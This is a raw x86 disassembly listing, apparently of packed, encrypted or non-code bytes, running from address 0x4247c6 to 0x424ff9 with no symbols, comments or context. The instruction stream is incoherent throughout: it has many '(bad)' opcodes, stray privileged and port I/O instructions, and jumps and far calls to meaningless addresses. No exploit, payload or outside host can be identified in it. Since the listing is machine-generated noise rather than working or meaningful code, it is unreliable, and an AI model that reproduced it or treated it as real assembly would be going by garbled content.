  4247c6:	add    ecx,ebx
  4247c8:	cdq    
  4247c9:	pop    edx
  4247ca:	imul   ebx,DWORD PTR [ebp+0x2782e8ae],0x2b1237a9
  4247d4:	xor    eax,0xe3e11434
  4247d9:	pop    es
  4247da:	cmp    BYTE PTR [eax+edi*8],0xa9
  4247de:	push   0xe1056543
  4247e3:	enter  0x9390,0x14
  4247e7:	xchg   ecx,eax
  4247e8:	pushf  
  4247e9:	sub    DWORD PTR [ebx+0x58],esp
  4247ec:	push   cs
  4247ed:	popa   
  4247ee:	mov    esi,0x8b7f7e5b
  4247f3:	(bad)  
  4247f4:	loop   0x4247a2
  4247f6:	imul   eax,DWORD PTR ds:0x9c51ffb0,0xffffffac
  4247fd:	mov    al,BYTE PTR [ebx+ecx*2-0x7dd8e23a]
  424804:	xor    dl,BYTE PTR [ebx+0x30069585]
  42480a:	dec    ecx
  42480b:	inc    ecx
  42480c:	scas   eax,DWORD PTR es:[edi]
  42480d:	repz or BYTE PTR [ebp-0x40],al
  424811:	xchg   ebx,eax
  424812:	xchg   esi,eax
  424813:	or     BYTE PTR [ecx+0x51c36524],cl
  424819:	or     ecx,ecx
  42481b:	jmp    0x4247b0
  42481d:	sbb    DWORD PTR [eax],edx
  42481f:	fimul  DWORD PTR [ecx]
  424821:	push   edi
  424822:	pop    edi
  424823:	fwait
  424824:	sbb    ecx,DWORD PTR [eax]
  424826:	adc    edx,DWORD PTR [edi+0x2d]
  424829:	(bad)  [edi]
  42482b:	test   al,0x57
  42482d:	les    edi,FWORD PTR [ecx+0x30d2023f]
  424833:	mov    cl,0xc6
  424835:	xor    DWORD PTR [ebx-0x49],ebx
  424838:	repz jb 0x4247ce
  42483b:	mov    esp,0xf0523082
  424840:	add    esp,DWORD PTR [edx-0x55]
  424843:	xchg   esp,eax
  424844:	sbb    DWORD PTR [esp+ecx*8-0x2515923],ebp
  42484b:	dec    edi
  42484c:	add    BYTE PTR [ecx-0x3d958d66],0xa8
  424853:	in     al,dx
  424854:	pushf  
  424855:	mov    cl,0x6b
  424857:	pop    eax
  424858:	add    al,0x0
  42485a:	or     al,0xd8
  42485c:	gs push 0xffffff94
  42485f:	je     0x42480f
  424861:	ins    BYTE PTR es:[edi],dx
  424862:	inc    esp
  424863:	push   cs
  424864:	jnp    0x42485b
  424866:	mov    ebp,0xde4865ec
  42486b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42486c:	sbb    al,0x6f
  42486e:	sub    eax,0xb13823ab
  424873:	xchg   ecx,eax
  424874:	outs   dx,BYTE PTR ds:[esi]
  424875:	mov    bl,0x56
  424877:	push   cs
  424878:	jmp    0xdd66f5f0
  42487d:	push   edi
  42487e:	ret    0x280c
  424881:	xlat   BYTE PTR ds:[ebx]
  424882:	into   
  424883:	mov    cs:0x5cd40099,eax
  424889:	pop    ds
  42488a:	cmp    DWORD PTR [edx+edx*4+0x56],ebx
  42488e:	inc    esi
  42488f:	pop    edx
  424890:	add    esp,DWORD PTR [edx]
  424892:	adc    DWORD PTR [edx-0x1b],ebx
  424895:	cmc    
  424896:	push   ebp
  424897:	(bad)  
  424898:	fnsave [ebx+eiz*2+0x6c]
  42489c:	fs popf 
  42489e:	dec    eax
  42489f:	inc    ebx
  4248a0:	mov    ch,0x93
  4248a2:	shl    BYTE PTR [esi-0x28],0x73
  4248a6:	loope  0x4248c9
  4248a8:	fs add al,0x71
  4248ab:	sahf   
  4248ac:	mov    BYTE PTR ds:0x463a4398,ch
  4248b2:	or     DWORD PTR [ecx+0x9],0x4f
  4248b6:	cmp    eax,0xd1a84894
  4248bb:	mov    cl,0xa1
  4248bd:	mov    cl,0xc2
  4248bf:	push   0x45d1080e
  4248c4:	jnp    0x4248ff
  4248c6:	repz dec ebx
  4248c8:	pop    eax
  4248c9:	mov    cs:0xacaacbf8,eax
  4248cf:	(bad)  
  4248d0:	pop    ebp
  4248d1:	or     DWORD PTR [ecx+0x32],esp
  4248d4:	cmp    eax,0xbbec8878
  4248d9:	inc    edi
  4248da:	sbb    dl,dh
  4248dc:	loop   0x42485f
  4248de:	inc    ebp
  4248df:	sub    eax,0xefd0793f
  4248e4:	jb     0x424881
  4248e6:	xor    al,0x2e
  4248e8:	adc    BYTE PTR [eax+0x45e7ef39],dl
  4248ee:	fst    QWORD PTR [eax+0x5]
  4248f1:	int    0x2
  4248f3:	push   esi
  4248f4:	jb     0x4248b5
  4248f6:	shr    DWORD PTR [edi-0x19d23b02],1
  4248fc:	cli    
  4248fd:	aaa    
  4248fe:	ret    0xf336
  424901:	mov    ds:0x9b5ddd04,al
  424906:	add    bh,al
  424908:	jnp    0x424924
  42490a:	test   ecx,0xb2d199c0
  424910:	shl    DWORD PTR [ebp-0x38],1
  424913:	icebp  
  424914:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424915:	pop    ebx
  424916:	xor    BYTE PTR [ebx+0x33],al
  424919:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42491a:	sahf   
  42491b:	lds    ecx,FWORD PTR [eax+ebx*2+0x4bbd097b]
  424922:	popa   
  424923:	(bad)  
  424924:	inc    ebx
  424925:	(bad)  
  424926:	leave  
  424927:	lahf   
  424928:	sti    
  424929:	call   0xb15b:0x294e5391
  424930:	pmaddwd mm0,QWORD PTR [edx+eax*8-0x28]
  424935:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424936:	cmp    DWORD PTR [ebx],esi
  424938:	mov    eax,ds:0xa8aba544
  42493d:	cwde   
  42493e:	pop    es
  42493f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424940:	and    bh,BYTE PTR [edi]
  424942:	test   eax,0xda3185fe
  424947:	ss in  eax,0xe4
  42494a:	fistp  WORD PTR [esi+0x56]
  42494d:	rcr    dh,cl
  42494f:	mov    WORD PTR [edi+0x15],?
  424952:	popa   
  424953:	sub    eax,0x20846838
  424958:	push   edx
  424959:	sbb    eax,0x605a3f12
  42495e:	sar    BYTE PTR [esi],1
  424960:	sub    dl,dh
  424962:	sbb    eax,0x99c7d88e
  424967:	mov    eax,0xd8bf7a7
  42496c:	adc    DWORD PTR [eax],ecx
  42496e:	jb     0x424965
  424970:	pop    ecx
  424971:	mov    ecx,0x50d0f424
  424976:	enter  0x87ea,0x84
  42497a:	add    eax,DWORD PTR [eax*4-0x43cab844]
  424981:	jns    0x424964
  424983:	cmp    DWORD PTR [ecx],edi
  424985:	imul   bh
  424987:	cmp    ebp,DWORD PTR [ecx-0x61]
  42498a:	jo     0x42492a
  42498c:	or     ch,BYTE PTR [eax+0x5d]
  42498f:	ret    0xf4f
  424992:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424993:	mov    dh,0xa
  424995:	aas    
  424996:	in     eax,dx
  424997:	lock xlat BYTE PTR ds:[ebx]
  424999:	dec    ecx
  42499a:	ret    
  42499b:	aad    0x47
  42499d:	push   eax
  42499e:	pop    ebp
  42499f:	mov    ds:0xbb550c35,al
  4249a4:	jmp    0x4249ba
  4249a6:	dec    ebp
  4249a7:	das    
  4249a8:	mov    dx,0xb6e8
  4249ac:	pusha  
  4249ad:	sub    edx,ebx
  4249af:	inc    edx
  4249b0:	(bad)  
  4249b2:	dec    edi
  4249b3:	sbb    DWORD PTR [esi-0x5fb1dd2f],ebp
  4249b9:	outs   dx,DWORD PTR ds:[esi]
  4249ba:	(bad)  
  4249bb:	pop    esp
  4249bc:	xchg   ebp,eax
  4249bd:	js     0x4249ae
  4249bf:	mov    al,ds:0xa145ab58
  4249c4:	mov    ch,bl
  4249c6:	dec    ebp
  4249c7:	mov    ah,0xb8
  4249c9:	fst    DWORD PTR [edx+0x38348724]
  4249cf:	scas   eax,DWORD PTR es:[edi]
  4249d0:	jns    0x424998
  4249d2:	ins    BYTE PTR es:[edi],dx
  4249d3:	std    
  4249d4:	ja     0x424a3c
  4249d6:	add    DWORD PTR [eax-0x4d],edx
  4249d9:	jle    0x4249fc
  4249db:	clc    
  4249dc:	mov    ds:0xa556a611,eax
  4249e1:	and    al,0xf
  4249e3:	mov    ?,WORD PTR [edx-0xfedfb3e]
  4249e9:	add    bl,BYTE PTR [ecx+edx*1+0x7be5cdf9]
  4249f0:	pop    eax
  4249f1:	call   0xc791c4a
  4249f6:	mov    al,0x99
  4249f8:	cmp    DWORD PTR [ecx],edi
  4249fa:	stos   DWORD PTR es:[edi],eax
  4249fb:	adc    DWORD PTR [edi+0x549baedb],0xffffffa9
  424a02:	dec    esi
  424a03:	jl     0x4249d4
  424a05:	sub    eax,0xd59c8863
  424a0a:	jp     0x4249de
  424a0c:	pop    ebx
  424a0d:	sbb    ecx,DWORD PTR [ecx+ebx*4]
  424a10:	jns    0x4249ef
  424a12:	jmp    DWORD PTR [ecx+eax*2-0x7d]
  424a16:	(bad)  
  424a17:	fild   QWORD PTR [ebx]
  424a19:	in     eax,dx
  424a1a:	push   0xca02ab52
  424a1f:	enter  0xf969,0x27
  424a23:	out    dx,eax
  424a24:	push   edi
  424a25:	enter  0x8389,0x20
  424a29:	int    0x34
  424a2b:	xchg   BYTE PTR [edi],cl
  424a2d:	jmp    0x92cc8907
  424a32:	jb     0x424a88
  424a34:	sbb    al,0x89
  424a36:	rcl    eax,0x40
  424a39:	xchg   ebp,eax
  424a3a:	adc    DWORD PTR [ecx],ecx
  424a3c:	mov    cl,0x1b
  424a3e:	push   ss
  424a3f:	xor    esi,esi
  424a41:	push   edx
  424a42:	xchg   DWORD PTR [ecx+0x68],ebx
  424a45:	jbe    0x424a11
  424a47:	cs jae 0x424a07
  424a4a:	jmp    0x58647021
  424a4f:	pop    ebp
  424a50:	dec    esi
  424a51:	repnz fld QWORD PTR [edi]
  424a54:	xchg   BYTE PTR [ebp-0x4d],bl
  424a57:	sbb    al,0xb5
  424a59:	test   ah,0xca
  424a5c:	xor    eax,0xe6dbf13a
  424a61:	mov    bl,0x5
  424a63:	adc    bh,bh
  424a65:	jbe    0x424a8e
  424a67:	in     al,dx
  424a68:	sbb    BYTE PTR ds:0x99f1d4e3,bl
  424a6e:	mov    es,WORD PTR [eax-0x72]
  424a71:	int    0xa3
  424a73:	mov    eax,0xfc597c0e
  424a78:	pop    edx
  424a79:	push   cs
  424a7a:	loopne 0x424af8
  424a7c:	dec    esp
  424a7d:	jae    0x424a2a
  424a7f:	test   eax,0xa546ec05
  424a84:	xor    bh,BYTE PTR [ebx-0x5373c13d]
  424a8a:	sbb    edx,DWORD PTR [edx]
  424a8c:	retf   
  424a8d:	push   esp
  424a8e:	add    ebp,DWORD PTR ds:0xff955ec7
  424a94:	cmc    
  424a95:	call   0xe6a93dcb
  424a9a:	loopne 0x424a45
  424a9c:	sub    ecx,DWORD PTR [ebx-0x3676c2d4]
  424aa2:	or     DWORD PTR [ecx],edx
  424aa4:	add    eax,0x91f9f007
  424aa9:	xor    ebx,eax
  424aab:	push   ss
  424aac:	pushf  
  424aad:	ret    0x3f9a
  424ab0:	ret    
  424ab1:	xor    ah,BYTE PTR [esi]
  424ab3:	mov    eax,ds:0x539315eb
  424ab8:	into   
  424ab9:	out    0xfd,al
  424abb:	call   0x853a:0xaf87863b
  424ac2:	and    eax,edi
  424ac4:	retf   
  424ac5:	js     0x424b27
  424ac7:	es push ecx
  424ac9:	cmp    al,BYTE PTR [edi-0x77]
  424acc:	xchg   edx,eax
  424acd:	mov    ebx,0x7bf6741
  424ad2:	jg     0x424a58
  424ad4:	mov    ds:0x947955d8,al
  424ad9:	cmp    al,0x56
  424adb:	lods   al,BYTE PTR ds:[esi]
  424adc:	dec    edi
  424add:	push   esi
  424ade:	rcr    edi,1
  424ae0:	mov    ch,0x21
  424ae2:	jg     0x424ae3
  424ae4:	push   esi
  424ae5:	jp     0x424b0b
  424ae7:	xchg   edi,eax
  424ae8:	sub    ch,BYTE PTR fs:[esi]
  424aeb:	inc    ecx
  424aec:	inc    ebx
  424aed:	mov    al,0x71
  424aef:	mov    bl,0x11
  424af1:	gs dec eax
  424af3:	pop    ds
  424af4:	inc    ebx
  424af5:	mov    eax,ds:0x2cceb3ad
  424afa:	repz cs inc ecx
  424afd:	dec    ebp
  424afe:	sub    eax,DWORD PTR [esi-0x482f447b]
  424b04:	mov    BYTE PTR [ebx-0x7723026a],0x3f
  424b0b:	or     bh,BYTE PTR [esi]
  424b0d:	and    BYTE PTR [ebx+0x68],dl
  424b10:	fild   WORD PTR [eax-0xffbf922]
  424b16:	pop    es
  424b17:	dec    edi
  424b18:	jge    0x424b83
  424b1a:	inc    esp
  424b1b:	push   ebx
  424b1c:	(bad)  
  424b1d:	inc    esp
  424b1f:	jl     0x424b60
  424b21:	push   esi
  424b22:	stos   BYTE PTR es:[edi],al
  424b23:	sti    
  424b24:	cdq    
  424b25:	dec    ecx
  424b26:	sub    eax,0xb7eedb22
  424b2b:	outs   dx,DWORD PTR ds:[esi]
  424b2c:	sub    bh,BYTE PTR [edi-0x4b647826]
  424b32:	loopne 0x424b24
  424b34:	imul   ebp,ebp,0xffffffe1
  424b37:	icebp  
  424b38:	fs mov ebx,0x7bbfd032
  424b3e:	shr    DWORD PTR [ebp+0x678be5bd],0xb0
  424b45:	cmp    ebx,DWORD PTR [eax+0x6f]
  424b48:	push   cs
  424b49:	hlt    
  424b4a:	jbe    0x424bc8
  424b4c:	mov    ds:0x4b36a3ed,eax
  424b51:	std    
  424b52:	inc    esp
  424b53:	mov    esi,0x5cf980c1
  424b58:	add    esi,DWORD PTR [edx+0x6c]
  424b5b:	loopne 0x424b44
  424b5d:	mov    bh,0x3e
  424b60:	jg     0x424b62
  424b62:	xor    eax,DWORD PTR [ebx+0x2a]
  424b65:	add    ecx,0x95266b7c
  424b6b:	pop    ebx
  424b6c:	jmp    0xb2de879
  424b71:	iret   
  424b72:	sub    DWORD PTR [esi-0x1cbf5cad],0xffffff86
  424b79:	(bad)  
  424b7a:	arpl   bx,sp
  424b7c:	icebp  
  424b7d:	stos   DWORD PTR es:[edi],eax
  424b7e:	xchg   esi,eax
  424b7f:	scas   al,BYTE PTR es:[edi]
  424b80:	mov    bl,0xaf
  424b82:	inc    edi
  424b83:	lods   al,BYTE PTR ds:[esi]
  424b84:	xchg   edx,eax
  424b85:	cli    
  424b86:	je     0x424b83
  424b88:	sub    BYTE PTR [esi+0x4340d91d],bl
  424b8e:	jne    0x424b6b
  424b90:	pop    ecx
  424b91:	sub    esi,esi
  424b93:	lock sbb al,0x5a
  424b96:	jg     0x424c03
  424b98:	pushf  
  424b99:	imul   esp,DWORD PTR [edi],0xac0d07d9
  424b9f:	ret    0xa7fe
  424ba2:	jns    0x424b56
  424ba4:	add    cl,dl
  424ba6:	test   edi,esp
  424ba8:	push   edx
  424ba9:	(bad)  
  424bab:	std    
  424bac:	enter  0x59da,0x1d
  424bb0:	mov    esi,0x35996571
  424bb5:	xchg   esp,eax
  424bb6:	jle    0x424bf9
  424bb8:	fmul   st,st(2)
  424bba:	jge    0x424b5e
  424bbc:	dec    edi
  424bbd:	ret    
  424bbe:	and    ch,BYTE PTR [eax+0x3b708811]
  424bc4:	sub    cl,bh
  424bc6:	jmp    0x6e77:0xa7746f1d
  424bcd:	jg     0x424bb2
  424bcf:	jecxz  0x424bd3
  424bd1:	mov    dh,0x49
  424bd3:	int    0x85
  424bd5:	xchg   esi,eax
  424bd6:	cmp    bl,BYTE PTR [esi-0x52]
  424bd9:	mov    dl,0x70
  424bdb:	jnp    0x424c5b
  424bdd:	test   al,0xc9
  424bdf:	add    ebx,ecx
  424be1:	xchg   ebp,eax
  424be2:	xor    al,0xa4
  424be4:	call   0xf271fbd0
  424be9:	inc    ebp
  424bea:	fild   QWORD PTR [esp+edi*2+0x78e400c2]
  424bf1:	push   ds
  424bf2:	pop    ds
  424bf3:	push   cs
  424bf4:	mov    ah,0x5f
  424bf6:	pop    ebp
  424bf7:	xchg   BYTE PTR [ebx+edx*1-0x59a66a33],cl
  424bfe:	pop    esi
  424bff:	sbb    ch,BYTE PTR [ecx+0x1]
  424c02:	jl     0x424c01
  424c04:	call   0x504c:0xbe6208ce
  424c0b:	mov    dl,0x15
  424c0d:	shl    DWORD PTR [eax],1
  424c0f:	test   BYTE PTR [ebx+eax*2-0x14],bl
  424c13:	jecxz  0x424c62
  424c15:	cdq    
  424c16:	addr16 xor eax,0xeb85822e
  424c1c:	stos   DWORD PTR es:[edi],eax
  424c1d:	adc    BYTE PTR [edx-0x6aabd1a2],dl
  424c23:	xor    al,0x13
  424c25:	gs and eax,0x1c7140d
  424c2b:	fwait
  424c2c:	outs   dx,DWORD PTR ds:[esi]
  424c2d:	repnz data16 mov ds,WORD PTR [ebx-0x17]
  424c32:	ss es (bad) 
  424c35:	cmp    DWORD PTR [edi+0x112f5cc9],esp
  424c3b:	stos   DWORD PTR es:[edi],eax
  424c3c:	test   al,0x64
  424c3e:	push   0xffffffd0
  424c40:	inc    ebp
  424c41:	xor    eax,0x4d0b69dd
  424c46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424c47:	push   es
  424c48:	xchg   BYTE PTR [eax-0x6e60b516],bh
  424c4e:	lahf   
  424c4f:	lds    ebp,FWORD PTR [ecx]
  424c51:	jno    0x424c16
  424c53:	shl    BYTE PTR [esi],0x18
  424c56:	xchg   DWORD PTR [ebx+eax*8-0x36],ebx
  424c5a:	push   ecx
  424c5b:	lea    ebp,[esi]
  424c5d:	inc    ecx
  424c5e:	out    dx,eax
  424c5f:	sti    
  424c60:	mov    eax,0xf400b495
  424c65:	ja     0x424cbd
  424c67:	aaa    
  424c68:	test   DWORD PTR [esp+eax*2],eax
  424c6b:	sbb    al,0x2e
  424c6d:	adc    al,bl
  424c6f:	sub    DWORD PTR [ecx],esp
  424c71:	ror    dl,0xb0
  424c74:	pop    esi
  424c75:	mov    al,0x77
  424c77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424c78:	and    cl,BYTE PTR ds:0xfb25c2ed
  424c7e:	xchg   edx,eax
  424c7f:	jle    0x424ccc
  424c81:	mov    esp,0x7594e26f
  424c86:	push   ecx
  424c87:	icebp  
  424c88:	ins    DWORD PTR es:[edi],dx
  424c89:	inc    ebx
  424c8a:	xchg   edx,eax
  424c8b:	pop    esp
  424c8c:	ret    0x406f
  424c8f:	mov    ebx,0xf940ad41
  424c94:	adc    al,0xe2
  424c96:	xor    al,0x0
	...
  424d14:	scas   eax,DWORD PTR es:[edi]
  424d15:	ror    esp,1
  424d17:	push   esp
  424d18:	(bad)  
  424d19:	pop    ebp
  424d1a:	mov    edi,0x5e13fbfb
  424d1f:	cmp    DWORD PTR [edi],ebx
  424d21:	adc    al,0x4c
  424d23:	sbb    DWORD PTR [edx-0x20],edi
  424d26:	add    DWORD PTR [eax],eax
  424d28:	imul   eax,DWORD PTR [edi],0x0
  424d2b:	add    al,bh
  424d2d:	cld    
  424d2e:	daa    
  424d2f:	sar    BYTE PTR [esi+0x15],cl
  424d32:	mov    cs,WORD PTR [ecx-0x27338f8c]
  424d38:	inc    edi
  424d39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424d3a:	inc    ecx
  424d3b:	call   0x20e9a469
  424d40:	and    eax,0xa145766f
  424d45:	push   ds
  424d46:	jb     0x424d6c
  424d48:	das    
  424d49:	scas   eax,DWORD PTR es:[edi]
  424d4a:	and    edi,0x238f260d
  424d50:	stos   BYTE PTR es:[edi],al
  424d51:	std    
  424d52:	ret    
  424d53:	xchg   ebp,eax
  424d54:	cld    
  424d55:	or     ecx,DWORD PTR [eax-0x4e]
  424d58:	push   0x75
  424d5a:	leave  
  424d5b:	pop    esi
  424d5c:	retf   0xec59
  424d5f:	mov    edx,0x3fac9763
  424d64:	call   0xdd06:0x43d2e872
  424d6b:	pop    edi
  424d6c:	repnz xlat BYTE PTR ds:[ebx]
  424d6e:	dec    edi
  424d6f:	fnstsw WORD PTR [ebx+0x3f4429e9]
  424d75:	mov    bl,0x92
  424d77:	pop    eax
  424d78:	cmp    BYTE PTR [edi-0x3244df42],dl
  424d7e:	sub    DWORD PTR [edx-0x7b6d4e2c],ebp
  424d84:	xlat   BYTE PTR ds:[ebx]
  424d85:	and    edx,ecx
  424d87:	in     al,dx
  424d88:	xor    eax,0x4c300d46
  424d8d:	adc    dl,ah
  424d8f:	jecxz  0x424d5c
  424d91:	xor    al,0xc6
  424d93:	jne    0x424d9f
  424d95:	pop    ss
  424d96:	sahf   
  424d97:	nop
  424d98:	mov    eax,ds:0x5eba2554
  424d9d:	imul   esi,DWORD PTR [edi-0x3b],0xffffff8c
  424da1:	fwait
  424da2:	aad    0x3f
  424da4:	cmp    al,0xcd
  424da6:	sbb    eax,0x8362ca45
  424dab:	xor    BYTE PTR [edx-0x19],cl
  424dae:	push   ds
  424daf:	in     al,dx
  424db0:	cld    
  424db1:	outs   dx,BYTE PTR ds:[esi]
  424db2:	(bad)  
  424db3:	xchg   esi,eax
  424db4:	cli    
  424db5:	frstor [ecx+ecx*4-0x27]
  424db9:	adc    DWORD PTR [eax],0x70dd5103
  424dbf:	in     al,0x52
  424dc1:	sar    BYTE PTR [ebx+0xb],0x62
  424dc5:	pusha  
  424dc6:	and    DWORD PTR [esi],edx
  424dc8:	push   es
  424dc9:	xor    dh,bh
  424dcb:	xchg   ebp,eax
  424dcc:	inc    ebp
  424dcd:	dec    edx
  424dce:	repz cli 
  424dd0:	dec    ebp
  424dd1:	aad    0x1e
  424dd3:	test   eax,0x2b60249a
  424dd8:	jmp    0x2f6e:0xc3c47882
  424ddf:	push   edi
  424de0:	mov    eax,ds:0xbd7d6eb9
  424de5:	jmp    0x356cbe8d
  424dea:	(bad)  
  424deb:	leave  
  424dec:	push   ss
  424ded:	(bad)  
  424dee:	lock inc ebp
  424df0:	test   esi,ebx
  424df2:	inc    edx
  424df3:	push   ss
  424df4:	fld    QWORD PTR [esi-0x323950a2]
  424dfa:	sbb    bh,BYTE PTR [eax-0x65]
  424dfd:	push   edx
  424dfe:	mov    esp,0x33a7dbd8
  424e03:	rcl    DWORD PTR [ebp+0xd],0x5f
  424e07:	loop   0x424e14
  424e09:	pop    edi
  424e0a:	mov    dl,0x65
  424e0c:	inc    ebp
  424e0d:	(bad)  
  424e0e:	sbb    BYTE PTR [edx+ebp*1-0x99b978],al
  424e15:	jp     0x424e6a
  424e17:	inc    ebx
  424e18:	push   ecx
  424e19:	retf   0x83c2
  424e1c:	inc    esp
  424e1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424e1e:	in     al,dx
  424e1f:	jbe    0x424e33
  424e21:	adc    eax,0xd36d5a7e
  424e26:	jl     0x424dd8
  424e28:	jmp    0x424e5c
  424e2a:	cli    
  424e2b:	out    0x6,al
  424e2d:	fstp   TBYTE PTR [eax]
  424e2f:	ss js  0x424e4b
  424e32:	push   0xfffffffe
  424e34:	adc    DWORD PTR ds:0x1e6dc0d9,edx
  424e3a:	mov    ds:0xdc871b62,al
  424e3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424e40:	adc    al,0xe0
  424e42:	aaa    
  424e43:	test   DWORD PTR [ebx-0x59cac1fd],ecx
  424e49:	add    DWORD PTR [ebp+0x3e4d6c32],0xffffff95
  424e50:	enter  0x2217,0xd5
  424e54:	lds    ebx,FWORD PTR [ebx-0x4f]
  424e57:	pop    es
  424e58:	call   0x6155fea4
  424e5d:	mov    al,ds:0x5810d912
  424e62:	or     al,0x1
  424e64:	cwde   
  424e65:	inc    ebx
  424e66:	push   0xe285daa7
  424e6b:	fs ret 
  424e6d:	sahf   
  424e6e:	shl    ebx,1
  424e70:	pusha  
  424e71:	push   esp
  424e72:	cmp    ch,BYTE PTR [esi-0x7494b077]
  424e78:	sti    
  424e79:	mov    DWORD PTR [edi-0x76],esi
  424e7c:	jmp    0x2d3edb7d
  424e81:	inc    esi
  424e82:	push   eax
  424e83:	inc    eax
  424e84:	jl     0x424e2a
  424e86:	inc    esp
  424e87:	ja     0x424eb5
  424e89:	or     BYTE PTR [edx+0x5b],dl
  424e8c:	fs out 0xf6,eax
  424e8f:	cmc    
  424e90:	jno    0x424e52
  424e92:	int3   
  424e93:	bound  edx,QWORD PTR [ecx]
  424e95:	xor    DWORD PTR [esi+0x1a],esp
  424e98:	es (bad) 
  424e9a:	jne    0x424ef5
  424e9c:	sub    al,0x25
  424e9e:	dec    BYTE PTR [esi]
  424ea0:	fdivrp st(4),st
  424ea2:	or     eax,0xd299542c
  424ea7:	leave  
  424ea8:	sub    ebx,DWORD PTR [edi]
  424eaa:	lods   eax,DWORD PTR ds:[esi]
  424eab:	outs   dx,BYTE PTR ds:[esi]
  424eac:	push   ebx
  424ead:	or     BYTE PTR [ebx],al
  424eaf:	mov    ebx,0xcfe62678
  424eb4:	xor    DWORD PTR [esi],0x1117cbbb
  424eba:	mov    dh,0x7f
  424ebc:	mov    eax,DWORD PTR [esi]
  424ebe:	fcmovbe st,st(1)
  424ec0:	adc    eax,0x3c11bb16
  424ec5:	sbb    al,bl
  424ec7:	or     eax,DWORD PTR [eax-0xf]
  424eca:	mov    eax,0x1d9159ae
  424ecf:	mov    edi,0x22be8ef8
  424ed4:	enter  0x587f,0x34
  424ed8:	arpl   WORD PTR [eax+0xa],dx
  424edb:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424edd:	dec    ebx
  424ede:	push   esp
  424edf:	dec    ebx
  424ee0:	ret    
  424ee1:	mov    edx,0xb8bfb099
  424ee6:	and    esp,esi
  424ee8:	stos   DWORD PTR es:[edi],eax
  424ee9:	pop    ds
  424eea:	sbb    DWORD PTR [edi+0xc],eax
  424eed:	add    DWORD PTR [ebp+0x35],eax
  424ef0:	cwde   
  424ef1:	xlat   BYTE PTR fs:[ebx]
  424ef3:	bnd jp 0x424f6a
  424ef6:	ror    cl,1
  424ef8:	push   0xff6710a4
  424efd:	arpl   WORD PTR [ebx-0x1c221c73],si
  424f03:	xor    eax,eax
  424f05:	je     0x424ee2
  424f07:	jmp    0xfd24b7b0
  424f0c:	scas   eax,DWORD PTR es:[edi]
  424f0d:	or     eax,0xc152cb52
  424f12:	loope  0x424ebf
  424f14:	outs   dx,DWORD PTR ds:[esi]
  424f15:	cmp    DWORD PTR [esi+0x6f],eax
  424f18:	lahf   
  424f19:	mov    cl,0xd9
  424f1b:	dec    ebx
  424f1c:	fld    TBYTE PTR [esi]
  424f1e:	retf   
  424f1f:	xor    bl,cl
  424f21:	push   esp
  424f22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424f23:	in     eax,0x2d
  424f25:	stc    
  424f26:	jmp    0xedc0:0x6317f4c8
  424f2d:	cmp    ecx,esp
  424f2f:	outs   dx,DWORD PTR ds:[esi]
  424f30:	pop    ebx
  424f31:	xor    edi,ecx
  424f33:	sub    BYTE PTR [esi+edi*4-0x7df4e2bd],ch
  424f3a:	call   DWORD PTR [edx+0x67]
  424f3d:	dec    ebp
  424f3f:	sub    DWORD PTR [esi+esi*1+0x3f],esp
  424f43:	dec    eax
  424f44:	xchg   edx,eax
  424f45:	jne    0x424f32
  424f47:	daa    
  424f48:	mov    edi,0x22d1133c
  424f4d:	mov    eax,0x32cb4298
  424f52:	jmp    0x424f51
  424f54:	in     al,0x40
  424f56:	mov    al,ds:0xd0841cdb
  424f5b:	cs ins BYTE PTR es:[edi],dx
  424f5d:	and    BYTE PTR [esi-0x60d09a36],al
  424f63:	pop    edx
  424f64:	mov    dl,0xdf
  424f66:	call   0xf14e:0xca63509c
  424f6d:	pop    ecx
  424f6e:	dec    ebx
  424f6f:	jno    0x424f75
  424f71:	add    al,0x47
  424f73:	xchg   edi,eax
  424f74:	icebp  
  424f75:	jp     0x424fd1
  424f77:	jno    0x424fae
  424f79:	cmp    BYTE PTR [eax+eax*8+0x54],ch
  424f7d:	add    BYTE PTR [ecx],ch
  424f7f:	lock mov ebp,0x9e712c8b
  424f85:	jg     0x424f87
  424f87:	punpckhbw mm4,QWORD PTR [edx+0x3e]
  424f8b:	cmp    DWORD PTR [ebx-0x6be77bc1],esp
  424f91:	neg    DWORD PTR [edx+ecx*8+0x31be3c60]
  424f98:	ficomp WORD PTR [ecx+esi*4+0x11009363]
  424f9f:	jg     0x424fd6
  424fa1:	bound  edx,QWORD PTR ds:0x62d0fa35
  424fa7:	xor    al,0x56
  424fa9:	jmp    0x598cfd30
  424fae:	jb     0x424f78
  424fb0:	mov    bl,0x60
  424fb2:	into   
  424fb3:	jb     0x424ff8
  424fb5:	lods   al,BYTE PTR ds:[esi]
  424fb6:	fist   WORD PTR [edi-0x3]
  424fb9:	mov    al,ds:0x4074cf96
  424fbe:	pop    ebx
  424fbf:	jae    0x42500b
  424fc1:	sahf   
  424fc2:	push   edx
  424fc3:	cmp    BYTE PTR [edi+0xe753565],cl
  424fc9:	cmc    
  424fca:	fld    QWORD PTR [edx+0x56]
  424fcd:	scas   al,BYTE PTR es:[edi]
  424fce:	mov    WORD PTR [ecx+0x1c],?
  424fd1:	(bad)  [ebp+ecx*4-0x18e8f41a]
  424fd8:	push   0x43
  424fda:	fldcw  WORD PTR [esi+0x424f3468]
  424fe0:	jae    0x424fb7
  424fe2:	rol    BYTE PTR [ecx],0x4c
  424fe5:	outs   dx,DWORD PTR ds:[esi]
  424fe6:	outs   dx,BYTE PTR ds:[esi]
  424fe7:	arpl   WORD PTR [esi],bx
  424fe9:	pop    edx
  424fea:	aas    
  424feb:	ins    DWORD PTR es:[edi],dx
  424fec:	ret    
  424fed:	mov    eax,DWORD PTR [esi]
  424fef:	loopne 0x424ffe
  424ff1:	leave  
  424ff2:	aam    0x4e
  424ff4:	in     al,0xc9
  424ff6:	jl     0x424fe6
  424ff8:	push   es
  424ff9:	mov    DWORD PTR [ecx+ebx*4],edi
